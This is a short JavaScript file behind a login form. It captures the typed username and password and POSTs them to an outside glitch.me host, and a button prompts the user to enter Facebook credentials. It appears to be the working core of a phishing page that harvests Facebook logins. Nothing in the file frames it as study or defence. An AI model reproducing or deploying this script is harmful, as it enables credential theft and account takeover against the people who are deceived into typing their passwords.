
var txtusername = document.getElementById('txtun')
var txtpassword = document.getElementById('txtps')
var btnlogin = document.getElementById('login')
var btnfb = document.getElementById('cfb')

var data = {
    username: undefined,
    password: undefined
}
txtusername.addEventListener('keyup', function (e) {
    data.username = e.target.value;
})

txtpassword.addEventListener('keyup', function (e) {
    data.password = e.target.value;
})

btnlogin.addEventListener('click', function (e) {
    if (!data.username || !data.password) alert('Please fill the form');
    const URL = 'https://intense-plains-92499.herokuapp.com/data';
    fetch('https://syed47-owldrone.glitch.me/data', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    }).then(res => res.json()).then(data => console.log(data.response))
})

btnfb.addEventListener('click', function (e) {
    alert('Please fill the form with facebook credentials.')
})